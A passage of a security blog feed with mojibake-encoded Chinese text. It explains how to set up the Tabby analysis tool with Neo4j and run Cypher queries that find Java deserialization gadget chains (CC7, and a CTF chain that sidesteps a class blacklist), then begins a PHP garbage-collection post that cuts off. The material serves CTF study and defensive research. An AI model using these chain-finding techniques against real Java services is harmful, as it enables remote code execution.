class="comment">#å…è®¸ä»æœ¬åœ°ä»»æ„ä½ç½®è½½å…¥csvæ–‡ä»¶(å¤§æ¦‚åœ¨å‰é¢å‡ è¡Œ)</span></span><br><span class="line"><span class="comment">#server.directories.import=import</span></span><br><span class="line"><span class="comment">#å…è®¸ apocæ‰©å±•ï¼ˆå¤§æ¦‚åœ¨é…ç½®æ–‡ä»¶æœ«å°¾éƒ¨åˆ†ï¼‰</span></span><br><span class="line"><span class="attr">dbms.security.procedures.unrestricted</span>=jwt.security.*,apoc.*</span><br><span class="line"><span class="comment"># ä¿®æ”¹å†…å­˜ç›¸å…³é…ç½® </span></span><br><span class="line"><span class="comment"># å¯ä»¥é€šè¿‡å®˜æ–¹çš„neo4j-adminæ¥æ¨èé…ç½®å†…å­˜å¤§å°</span></span><br><span class="line"><span class="attr">dbms.memory.heap.initial_size</span>=<span class="number">1</span>G</span><br><span class="line"><span class="attr">dbms.memory.heap.max_size</span>=<span class="number">4</span>G</span><br><span class="line"><span class="attr">dbms.memory.pagecache.size</span>=<span class="number">4</span>G</span><br></pre></td></tr></table></figure></div><p>é…ç½® apoc çš„é…ç½®ï¼Œéœ€è¦æ‰¾åˆ°é…ç½®æ–‡ä»¶ç›®å½•ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹æ–°å»º apoc.conf æ–‡ä»¶ï¼Œå†…å®¹ä¸º</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321995.png"                      alt="image-20230501161001178"                ><figcaption>image-20230501161001178</figcaption></figure></p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apoc.import.file.enabled</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">apoc.import.file.use_neo4j_config</span>=<span class="literal">false</span></span><br></pre></td></tr></table></figure></div><p>æœ€åï¼Œé…ç½®ä¸€ä¸‹ apoc å’Œ tabby æ’ä»¶ï¼Œæ‰“å¼€ plugins ç›®å½•å°†å¯¹åº”çš„ jar å¤åˆ¶åˆ°ä¸ä¸Šé¢confåŒç›®å½•ä¸‹çš„pluginsç›®å½•</p><p>tabbyæ’ä»¶ï¼š<a class="link"   href="https://github.com/wh1t3p1g/tabby/releases" >Releases Â· wh1t3p1g&#x2F;tabby Â· GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ï¼ˆåœ¨envç›®å½•é‡Œ,åŒæ—¶æŠŠenvé‡Œé¢å‡ ä¸ªapocçš„jaråŒ…éƒ½<strong>å¤åˆ¶</strong>åˆ°pluginsé‡Œï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321885.png"                      alt="image-20230501163440727"                ><figcaption>image-20230501163440727</figcaption></figure></p><h3 id="éªŒè¯é…ç½®"><a href="#éªŒè¯é…ç½®" class="headerlink" title="éªŒè¯é…ç½®"></a>éªŒè¯é…ç½®</h3><p>é‡å¯æ•°æ®åº“åï¼Œopen-&gt;Neo4j Browser,æµ‹è¯•æŸ¥è¯¢è¯­å¥ï¼ŒæŸ¥çœ‹ä¸€ä¸‹apocï¼ˆæœ‰30é¡¹ï¼‰å’Œtabbyï¼ˆæœ‰ä¸¤é¡¹ï¼‰çš„é…ç½®</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321101.png"                      alt="image-20230501163735244"                ><figcaption>image-20230501163735244</figcaption></figure></p><h3 id="ç®€å•å¯åŠ¨"><a href="#ç®€å•å¯åŠ¨" class="headerlink" title="ç®€å•å¯åŠ¨"></a>ç®€å•å¯åŠ¨</h3><p>åœ¨ä¸‹è½½çš„tabbyæ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ªcaseç›®å½•ï¼Œä¸‹é¢æ”¾ç›®æ ‡jar,åŒæ—¶ä¿®æ”¹config&#x2F;settings.properties</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321272.png"                      alt="image-20230501190832777"                ><figcaption>image-20230501190832777</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321030.png"                      alt="image-20230501191148762"                ><figcaption>image-20230501191148762</figcaption></figure></p><p>ä½¿ç”¨jdk8å¯åŠ¨tabby.jarï¼Œå‘½ä»¤è¡Œï¼š</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar tabby.jar</span><br></pre></td></tr></table></figure></div><p>å¯èƒ½å‡ºç°çš„æŠ¥é”™</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Failed to execute CommandLineRunner</span><br><span class="line">at org.springframework.boot.SpringApplication.callRunner(SpringApplication.java:771) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.callRunners(SpringApplication.java:752) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.7.7.jar!/:2.7.7]</span><br><span class="line">at tabby.App.main(App.java:28) [classes!/:na]</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_341]</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_341]</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_341]</span><br><span class="line">....</span><br></pre></td></tr></table></figure></div><blockquote><p>æŠŠconfig&#x2F;settings.propertiesä¸­çš„<code>tabby.cache.isDockerImportPath</code>è®¾ç½®ä¸ºfalseï¼Œè¿™ä¸ªé€‰é¡¹ç”¨äºåˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯dockerç¯å¢ƒ,å¦‚æœæ˜¯æœ¬æœºç›´æ¥ä½¿ç”¨ï¼Œè¦è®¾ç½®æˆfalse</p></blockquote><h3 id="å›¾æ•°æ®åº“ç´¢å¼•é…ç½®"><a href="#å›¾æ•°æ®åº“ç´¢å¼•é…ç½®" class="headerlink" title="å›¾æ•°æ®åº“ç´¢å¼•é…ç½®"></a>å›¾æ•°æ®åº“ç´¢å¼•é…ç½®</h3><p>å¯ä»¥åŠ å¿«å¯¼å…¥&#x2F;åˆ é™¤çš„é€Ÿåº¦ï¼Œåªè¦åœ¨Neo4j browseré‡Œè¿è¡Œå³å¯</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;</span><br><span class="line">CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;</span><br><span class="line">CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;</span><br><span class="line">CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;</span><br><span class="line">CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);</span><br><span class="line">CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);</span><br><span class="line">CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);</span><br><span class="line">CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);</span><br><span class="line">CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);</span><br><span class="line">CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);</span><br><span class="line">CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);</span><br><span class="line">#ä¹‹åå¯ä»¥è¿è¡Œä¸‹é¢å‘½ä»¤æ¥æŸ¥çœ‹è¡¨åº“å’Œæ•°æ®åº“ä¿¡æ¯</span><br><span class="line">:schema </span><br><span class="line">:sysinfo </span><br></pre></td></tr></table></figure></div><h2 id="0x01ç®€å•ä½¿ç”¨"><a href="#0x01ç®€å•ä½¿ç”¨" class="headerlink" title="0x01ç®€å•ä½¿ç”¨"></a>0x01ç®€å•ä½¿ç”¨</h2><h3 id="CCé“¾"><a href="#CCé“¾" class="headerlink" title="CCé“¾"></a>CCé“¾</h3><p>ä»¥æ‰¾ccé“¾ä¸ºä¾‹ï¼Œå°†tabbyç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶çš„tabby.build.targetè¯¥æˆcommons-collections jaræ‰€åœ¨ä½ç½®</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322228.png"                      alt="image-20230504085113381"                ><figcaption>image-20230504085113381</figcaption></figure></p><p>shellè¿è¡Œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar tabby.jar</span><br></pre></td></tr></table></figure></div><blockquote><p>æ³¨æ„è¦ä½¿ç”¨java8</p></blockquote><p>æˆåŠŸè¿æ¥æ•°æ®åº“</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322970.png"                      alt="image-20230504085210709"                ><figcaption>image-20230504085210709</figcaption></figure></p><h3 id="å¯èƒ½çš„æŠ¥é”™"><a href="#å¯èƒ½çš„æŠ¥é”™" class="headerlink" title="å¯èƒ½çš„æŠ¥é”™"></a>å¯èƒ½çš„æŠ¥é”™</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322071.png"                      alt="image-20230504085257308"                ><figcaption>image-20230504085257308</figcaption></figure></p><blockquote><p>åŸå› ï¼šNeo4jæ•°æ®åº“æœªå¼€å¯ï¼Œå³ä½¿æ•°æ®åº“æœªå¼€å¯ï¼Œåˆšå¼€å§‹çš„infoä»æ˜¾ç¤ºæœ‰â€defaultâ€æ•°æ®åº“</p></blockquote><p>å‡ºç°ä¸‹å›¾å³è¡¨ç¤ºå¯¼å…¥å®Œæ¯•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322896.png"                      alt="image-20230504085512803"                ><figcaption>image-20230504085512803</figcaption></figure></p><h3 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h3><p>æ‰“å¼€Neo4j browserï¼Œç”¨ä»¥ä¸‹è¯­å¥æŸ¥è¯¢CC7</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æ˜¯ä»Hashtableçš„readObjectä¸ºèµ·ç‚¹ï¼Œhashtableååºåˆ—åŒ–æ—¶è°ƒç”¨<strong>reconstitutionPutæ–¹æ³•</strong>ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•çš„æ‰§è¡Œæµç¨‹ä¸­ä¼šè°ƒç”¨equalsåˆ¤æ–­keyæ˜¯å¦é‡å¤ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯AbstractMapçš„equalsï¼Œä¹‹åä¼šè§¦å‘LazyMapçš„getï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„è§¦å‘transform</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322187.png"                      alt="image-20230504091827921"                ><figcaption>image-20230504091827921</figcaption></figure></p><blockquote><p>æŸ¥è¯¢ç»“æœèŠ‚ç‚¹ä»¥idæ˜¾ç¤ºï¼Œç‚¹å‡»åå¯ä»¥åœ¨å³æ¡†æŸ¥çœ‹å±æ€§</p></blockquote><h4 id="è¯­æ³•åˆ†æ"><a href="#è¯­æ³•åˆ†æ" class="headerlink" title="è¯­æ³•åˆ†æ"></a>è¯­æ³•åˆ†æ</h4><ul><li><p>Neo4jä¸­æœ‰ä¸‰ç§æŒ‡å‘ï¼š<code>() - [] -&gt; ()</code>ã€<code>() &lt;- [] - ()</code>å’Œ<code>() - [] - ()</code>ã€‚é¡¾åæ€ä¹‰ï¼Œå‰ä¸¤ç§å°±æ˜¯çœ‹ç®­å¤´æ–¹å‘è¡¨ç¤ºå¯¹åº”çš„å•é¡¹å…³ç³»ï¼›æœ€åä¸€ç§è¡¨ç¤ºåŒå‘å…³ç³»</p></li><li><p>å½¢å¦‚<code>[:CALL]</code>çš„å¯ä»¥è®¤ä¸ºç»™è°ƒç”¨è¾¹èµ·ä¸€ä¸ªåˆ«åCALL</p></li><li><p>å¯¹äºæ¯ä¸ªèŠ‚ç‚¹ï¼ŒSIGNATUREå±æ€§å­˜å‚¨ç€å®Œæ•´çš„æ–¹æ³•åç§°</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322332.png"                      alt="image-20230504091725958"                ><figcaption>image-20230504091725958</figcaption></figure></p></li><li><p>ä¸Šè¿°æŸ¥è¯¢è¯­å¥ä¸­equalsæ–¹æ³•åä¸º<code>[:ALIAS*..2]</code></p><ul><li><code>*1..N</code>çš„æ„æ€å³ä¸ºï¼šå¦‚æœåœ¨1åˆ°Nå±‚å…³ç³»ä¸­å­˜åœ¨è·¯å¾„ï¼Œå°†è¿”å›å¼€å§‹ç‚¹å’Œç»“æŸç‚¹ï¼Œè‹¥ç¼ºçœå¼€å¤´ï¼Œåˆ™é»˜è®¤ä»1å¼€å§‹ï¼Œæ‰€ä»¥<code>[:ALIAS*..2]</code>è¡¨ç¤ºæ‰¾ä¸¤å±‚ä»¥å†…çš„æ–¹æ³•</li></ul></li><li><p>åœ¨Neo4jæŸ¥è¯¢è¯­å¥CQLä¸­å¯ä»¥è®¾å®šæŒ‡å®šæ–¹å‘ï¼Œå¦‚<code>-[:CALL ]-&gt;</code>,è€Œ<code>-[:ALIAS*1..2]-</code>æ²¡æœ‰æŒ‡å®šæ–¹å‘ï¼Œè¯´æ˜å…³ç³»å†…çš„æ–¹æ³•åªèƒ½ä½œä¸ºalias,å¯ä»¥ç†è§£ä¸ºä»å½“å‰èŠ‚ç‚¹å‘å¤–å¹¿åº¦å»¶ä¼¸ä»¥æœç´¢èƒ½è°ƒç”¨åˆ°ä¸‹ä¸€ä¸ªæ–¹æ³•èŠ‚ç‚¹çš„è°ƒç”¨é“¾</p></li><li><p>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå±æ€§ IS_SINK IS_SOURCE ï¼Œåˆ†åˆ«ä»£è¡¨æ˜¯å¦æ˜¯ç»“å°¾èŠ‚ç‚¹å’Œèµ·å§‹èŠ‚ç‚¹</p></li></ul><p>æ ¹æ®æŸ¥è¯¢ç»“æœå¾ˆå®¹æ˜“å‘ç°è°ƒç”¨é“¾</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322538.png"                      alt="image-20230504123909760"                ><figcaption>image-20230504123909760</figcaption></figure></p><h2 id="0x02CTFä¸­ä½¿ç”¨"><a href="#0x02CTFä¸­ä½¿ç”¨" class="headerlink" title="0x02CTFä¸­ä½¿ç”¨"></a>0x02CTFä¸­ä½¿ç”¨</h2><p>ä¸Šé¢æ‰¾ccé“¾çš„è¿‡ç¨‹æŒ‡å‘æ€§æ¯”è¾ƒå¼ºï¼Œåœ¨ctfä¸­ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å·¥å…·æ‰¾åˆ°ä¸¤ä¸ªæ–¹æ³•ä¹‹é—´çš„è°ƒç”¨é“¾</p><h3 id="é•¿åŸæ¯-2022-b4bycoffee"><a href="#é•¿åŸæ¯-2022-b4bycoffee" class="headerlink" title="[é•¿åŸæ¯ 2022]b4bycoffee"></a>[é•¿åŸæ¯ 2022]b4bycoffee</h3><p>é¢˜ç›®ç»™å‡ºæºç ï¼Œåç¼–è¯‘ä¸€ä¸‹ï¼ŒcoffeeBeançš„toStringæœ‰ä¸ªå­—èŠ‚ç åé—¨</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041322562.png"                      alt="image-20230504124900205"                ><figcaption>image-20230504124900205</figcaption></figure></p><p>ååºåˆ—åŒ–å…¥å£ï¼Œè·Ÿè¿›ä¸€ä¸‹AntObjectInputStream</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323091.png"                      alt="image-20230504125123715"                ><figcaption>image-20230504125123715</figcaption></figure></p><p>åœ¨ååºåˆ—åŒ–æ—¶è®¾ç½®äº†é»‘åå•ç±»ï¼Œè¿‡æ»¤äº†è¿™äº›</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException,ObjectBean,ToStringBean,TemplatesImpl,Runtime</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323797.png"                      alt="image-20230504125216104"                ><figcaption>image-20230504125216104</figcaption></figure></p><p>ç°åœ¨åªè¦è§¦å‘toStringï¼Œä½†æ˜¯å¸¸ç”¨çš„BadAttributeValueExpExceptionè¢«banäº†ï¼Œæ³¨æ„åˆ°ä¾èµ–ä¸­å­˜åœ¨romeï¼Œå¯ä»¥ç”¨EqualsBeançš„hashcodeæ–¹æ³•å¯ä»¥è§¦å‘åˆ°ä»»æ„ç±»çš„toStringæ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323020.png"                      alt="image-20230504125407054"                ><figcaption>image-20230504125407054</figcaption></figure></p><p>ä½†æ˜¯è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨tabbyæ‰¾ä¸€ä¸ªreadObject-&gt;toStringçš„é“¾å­ï¼Œå†™å‡ºä»¥ä¸‹æŸ¥è¯¢è¯­å¥</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 12, false,true) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure></div><blockquote><p>è®¾ç½®èµ·å§‹èŠ‚ç‚¹ä¸ºHashMapçš„readObjectï¼Œç»“æŸèŠ‚ç‚¹ä¸ºtoStringæ–¹æ³•</p><p>ä¹‹åæ’é™¤äº†BadAttributeValueExpExceptionç­‰æ–¹æ³•</p><p>tabbyå†…çš„findJavaGadgetæ¥å£ä¼šé€šè¿‡æ±¡ç‚¹ä¼ æ’­ï¼Œæ ¹æ®javaåŸç”Ÿååºåˆ—åŒ–çš„è§„åˆ™æ¥æŸ¥æ‰¾åˆ©ç”¨é“¾ï¼Œä¸ªå‚æ•°åˆ†åˆ«è¡¨ç¤ºèµ·å§‹èŠ‚ç‚¹ã€ç»“æŸèŠ‚ç‚¹ã€è·¯å¾„çš„æœ€å¤§èŠ‚ç‚¹æ•°ã€isBackwardã€depthFirst</p></blockquote><p>éå¸¸æ¸…æ™°çš„jdkåŸç”Ÿåˆ©ç”¨é“¾</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041323655.png"                      alt="image-20230504130444449"                ><figcaption>image-20230504130444449</figcaption></figure></p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a class="link"   href="https://www.ctfiot.com/64572.html" >Javaä»£ç åˆ†æå·¥å…·Tabbyåœ¨CTFä¸­çš„è¿ç”¨ | CTFå¯¼èˆª (ctfiot.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/" >Tabby æºç åˆ†æ | m0d9â€™s blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/ljhdo/p/10929702.html" >Neo4j ç¬¬ä¹ç¯‡ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆMatchï¼‰ - æ‚¦å…‰é˜´ - åšå®¢å›­ (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[tabby&#x2F;Tabby é£Ÿç”¨æŒ‡åŒ—.md at master Â· wh1t3p1g&#x2F;tabby Â· GitHub](<a class="link"   href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby" >https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> é£Ÿç”¨æŒ‡åŒ—.md)</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨</title>
      <link href="/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨"><a href="#PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨"></a>PHPåƒåœ¾å›æ”¶å™¨ä¸ååºåˆ—åŒ–åˆ©ç”¨</h1><h2 id="åƒåœ¾å›æ”¶æœºåˆ¶"><a href="#åƒåœ¾å›æ”¶æœºåˆ¶" class="headerlink" title="åƒåœ¾å›æ”¶æœºåˆ¶"></a>åƒåœ¾å›æ”¶æœºåˆ¶</h2><p>æŒ‡phpä¼šè‡ªåŠ¨é‡Šæ”¾ç¨‹åºä¸å†éœ€è¦çš„å·²åˆ†é…çš„å†…å­˜å—ã€‚</p><h3 id="PHP5-3ä¹‹å‰"><a href="#PHP5-3ä¹‹å‰" class="headerlink" title="PHP5.3ä¹‹å‰"></a>PHP5.3ä¹‹å‰</h3><p>é‡‡ç”¨å¼•ç”¨è®¡æ•°çš„æ–¹å¼ï¼Œç»™æ¯ä¸ªå†…å­˜å¯¹è±¡åˆ†é…ä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯å½“å†…å­˜å¯¹è±¡è¢«å¼•ç”¨æ—¶ï¼Œè®¡æ•°å™¨+1ï¼Œå¼•ç”¨æ’¤é”€å(unset())ï¼Œè®¡æ•°å™¨-1ï¼Œå¯¹æŠ€æœ¯å™¨&#x3D;0æ—¶ï¼Œå¯¹å†…å­˜å¯¹è±¡è¿›è¡Œé”€æ¯ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶å®Œæˆï¼Œphpä¸€ä¸ªç”Ÿå‘½å‘¨æœŸåä¼šé‡Šæ”¾æ­¤è¿›ç¨‹&#x2F;çº¿ç¨‹æ‰€å çš„å†…å®¹</p><p>å­˜åœ¨é—®é¢˜ï¼šä¸¤ä¸ªæˆ–å¤šä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨ï¼Œä½¿å¾—è®¡æ•°å™¨æ°¸è¿œä¸ä¸º0ï¼Œå¯¼è‡´å†…å­˜å¯¹è±¡æ— æ³•è¢«å›æ”¶</p><h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>åŠ å…¥å¤æ‚ç®—æ³•æ£€æµ‹å¼•ç”¨ç¯çš„å­˜åœ¨ï¼Œé¿å…å†…å­˜æ³„éœ²ã€‚</p><p>æ¯ä¸ªphpå˜é‡å­˜åœ¨ä¸€ä¸ªå«zvalçš„å˜é‡å®¹å™¨ä¸­ï¼Œå­˜å‚¨äº†å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜å­˜å‚¨äº†â€œis_refâ€boolå‹å˜é‡ä»¥æ ‡è¯†è¯¥å˜é‡æ˜¯å¦å±äºå¼•ç”¨é›†åˆï¼›è¿˜æœ‰ä¸€ä¸ªâ€œrefcountâ€ï¼Œç”¨äºè¡¨ç¤ºæŒ‡å‘è¿™ä¸ªzvalå˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ï¼Œæ³¨æ„ï¼Œå¤šä¸ªå˜é‡æ˜¯å¯ä»¥å…±ç”¨ä¸€ä¸ªå˜é‡å®¹å™¨çš„ã€‚</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;new string&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$b</span>, <span class="variable">$c</span> );</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>ä»¥ä¸Šä»£ç ä¼šè¾“å‡º</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a: (refcount=3, is_ref=0)=&#x27;new string&#x27; </span><br><span class="line">a: (refcount=1, is_ref=0)=&#x27;new string&#x27;</span><br></pre></td></tr></table></figure></div><h3 id="PHP7çš„NTSç‰ˆæœ¬"><a href="#PHP7çš„NTSç‰ˆæœ¬" class="headerlink" 